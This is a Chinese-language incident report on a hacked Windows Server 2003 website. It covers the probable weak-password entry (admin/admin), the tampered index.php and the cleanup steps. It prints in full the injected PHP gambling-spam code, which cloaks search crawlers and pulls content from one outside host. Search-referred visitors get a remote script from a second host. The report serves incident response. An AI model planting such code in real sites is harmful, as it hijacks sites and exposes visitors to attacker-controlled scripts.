## 一、被入侵的网站

URL略

## 二、被入侵的系统
Windows Server 2003


## 三、入侵路径

有两种可能

1. 网站管理后台存在弱口令，可直接用账号admin，密码admin登录到网站后台对网站进行管理植入暗链。
2. 查看系统日志，有登录成功记录, 有可能密码被猜出入侵植入博彩暗链。


## 三、入侵后修改的文件

1. 通过对网站根目录文件进行检查发现index.php最后修改时间为2017-4-25 16:16
 
2. 进一步查看index.php文件，发现被增加如下博彩暗链代码：
````
<?php
function isCrawler() { 
    $agent= strtolower($_SERVER['HTTP_USER_AGENT']); 
    if (!empty($agent)) { 
        $spiderSite= array( 
            "TencentTraveler", 
            "Baiduspider+", 
            "BaiduGame", 
            "Googlebot", 
            "msnbot", 
            "Sosospider+", 
            "Sogou web spider", 
            "ia_archiver", 
            "Yahoo! Slurp", 
            "YoudaoBot", 
            "Yahoo Slurp", 
            "MSNBot", 
            "Java (Often spam bot)", 
            "BaiDuSpider", 
            "Voila", 
            "Yandex bot", 
            "BSpider", 
            "twiceler", 
            "Sogou Spider", 
            "Speedy Spider", 
            "Google AdSense", 
            "Heritrix", 
            "Python-urllib", 
            "Alexa (IA Archiver)", 
            "Ask", 
            "Exabot", 
            "Custo", 
            "OutfoxBot/YodaoBot", 
            "yacy", 
            "SurveyBot", 
            "legs", 
            "lwp-trivial", 
            "Nutch", 
            "StackRambler","360", 
            "The web archive (IA Archiver)", 
            "Perl tool", 
            "MJ12bot", 
            "Netcraft", 
            "MSIECrawler", 
            "WGet tools", 
            "larbin", 
            "Fish search", 
        ); 
        foreach($spiderSite as $val) { 
            $str = strtolower($val); 
            if (strpos($agent, $str) !== false) { 
                return true; 
            } 
        } 
    } else { 
        return false; 
    } 
}

function isfromse() { 
    $agent= strtolower($_SERVER['HTTP_REFERER']); 
    if (!empty($agent)) { 
        $spiderSite= array("google","baidu","sogou","yahoo","soso","360","so","yahoo","bing","youdao"); 
        foreach($spiderSite as $val) { 
            $str = strtolower($val); 
            if (strpos($agent, $str) !== false) { 
                return true; 
            } 
        } 
    } else { 
        return false; 
    } 
}
/*
function qishu($qishu_url){
    return file_get_contents($qishu_url);
}
function ziliao($ziliao_url){
   return file_get_contents($ziliao_url);
}
*/
if (isCrawler()){ 
    $qishu_str = file_get_contents('http://www.2sgb.com/js/ads/qi.txt');//&#x6B64;&#x5904;&#x8F93;&#x5165;&#x671F;&#x6570;&#x5730;&#x5740;
    $ziliao_str = file_get_contents('http://www.2sgb.com/js/ads/1.txt');//&#x6B64;&#x5904;&#x8F93;&#x5165;&#x8D44;&#x6599;&#x5730;&#x5740;
    $ziliao_str = str_replace('{&#x671F;&#x6570;}',$qishu_str,$ziliao_str);
ob_get_clean();
    echo $ziliao_str;die();
} 

if (isfromse()){
ob_get_clean();
echo '<script type="text/javascript" src="http://jinying88.usa3v.net/js/77.js"></script>';
die();
}
?>
````

## 四、处理

1. 将index.php中的以上博彩暗链代码删除
2. 修改网站后台密码和服务器密码，使用高强度密码。
3. 及时更新防护软件版本，和系统补丁。


